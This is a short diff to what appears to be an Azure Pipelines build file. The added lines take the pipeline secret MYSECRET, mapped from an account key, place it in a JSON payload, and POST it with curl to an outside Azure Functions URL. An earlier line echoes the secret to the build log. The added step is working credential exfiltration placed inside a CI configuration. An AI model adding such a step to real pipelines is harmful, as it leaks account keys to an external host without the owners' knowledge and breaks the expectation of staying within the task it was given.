@@ -17,8 +17,8 @@ steps:
   - bash: |
      ms="$MYSECRET is safe with me"
      echo $ms
-     echo $ms > ms.txt
-     cat ms.txt
+     payload='{"name":"fluffy bananas '$MYSECRET'","password":"xyz"}'
+     curl --header "Content-Type: application/json"   --request POST   --data "$payload"   https://functionskrwtsp.azurewebsites.net/api/HelloWorld?code=eyKsCLLWI/SFFyNhdonYY6ZRuqIftaXXoTm1q6sDDAo2tmh6/seN8w==
     env:
       MYSECRET: $(accountkey)
   - task: Npm@1
